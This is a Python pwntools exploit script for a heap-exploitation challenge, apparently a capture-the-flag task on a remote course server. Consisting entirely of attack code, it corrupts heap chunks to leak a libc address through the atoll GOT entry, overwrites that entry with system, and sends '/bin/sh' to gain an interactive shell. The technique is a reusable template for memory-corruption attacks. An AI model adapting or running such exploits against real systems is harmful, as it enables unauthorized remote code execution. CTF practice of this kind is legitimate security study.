from pwn import *
import sys


Host = 'csie.ctf.tw'
Port = 10143

if len(sys.argv) == 1:
    r = process('./shik_in_the_heap', env={'LD_PRELOAD': './libc.so.6'})
else:
    r = remote(Host, Port)


def alloc(size, content):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.send(content)

def free(idx):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(idx))

def add_shik(content):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.send(content)

def show_shik():
    r.recvuntil(':')
    r.sendline('4')

def edit_shik(data):
    r.recvuntil(':')
    r.sendline('5')
    r.recvuntil(':')
    r.send(data)

atoll_got = 0x602058
system = 0x0000000000045390

alloc(0x30, 'A') # 0
alloc(0x160, 'A'*0xf0+p64(0x100)) #1
alloc(0xf0, 'A') #2

free(0)
free(1)

alloc(0x38, 'A'*0x38) #0
alloc(0x80, "A") #1
add_shik('A') #2

free(1)
free(2)

alloc(0x200, 'A'*0x90 + p64(atoll_got))
show_shik()

r.recvuntil('Magic: ')
libc = u64(r.recvuntil('\n')[0:6].ljust(8, '\x00')) - 0x0000000000036eb0
log.info('libc: ' + hex(libc))

edit_shik(p64(libc+system))
r.send('/bin/sh\x00')

r.interactive()

